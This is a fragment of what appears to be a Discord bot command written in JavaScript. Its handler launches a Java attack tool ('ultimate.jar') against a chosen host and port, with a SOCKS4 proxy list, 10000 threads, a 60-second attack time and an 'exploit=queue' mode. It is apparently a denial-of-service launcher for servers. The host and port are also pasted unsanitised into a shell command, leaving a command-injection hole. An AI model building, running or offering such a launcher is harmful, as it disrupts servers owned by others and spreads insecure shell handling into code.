...
module.exports = {
  ...
  run: async ({client, message, args, MessageEmbed}) => {
    ...
    exec(`timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar ultimate.jar host=${host} port=${port} proxiesFile=socks4_proxies.txt threads=10000 attackTime=60 exploit=queue`, (error, stdout, stderr) => {
    });
